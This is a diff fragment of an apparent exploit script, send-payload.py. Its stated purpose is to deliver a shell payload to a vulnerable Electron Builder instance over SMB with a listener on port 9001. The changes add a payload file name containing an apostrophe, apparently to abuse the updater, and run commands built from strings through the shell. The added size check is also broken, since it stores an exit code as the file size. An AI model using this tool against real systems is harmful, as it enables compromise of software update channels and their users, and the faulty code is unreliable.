@@ -20,7 +20,7 @@ def gen_payload(ip, port, payload, dir):
 
     print("Running command: " + cmd_str)
     
-    command = subprocess.call(cmd_str, shell=True)
+    subprocess.call(cmd_str, shell=True)
 
 def main():
     parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")
@@ -76,7 +76,12 @@ def main():
     #generate shell payload
     gen_payload(ip, port, payload, path)
 
-    # check SMB running
+    payload_path = path + "heedv1'Setup1.0.1.exe"
+    print("Payload saved at: " + payload_path)
+    
+    #get size of payload
+    size = subprocess.call('stat -c%s "' + payload_path + '"')
+    print("Size: " + str(size))
 
 if __name__ == '__main__':
     main()
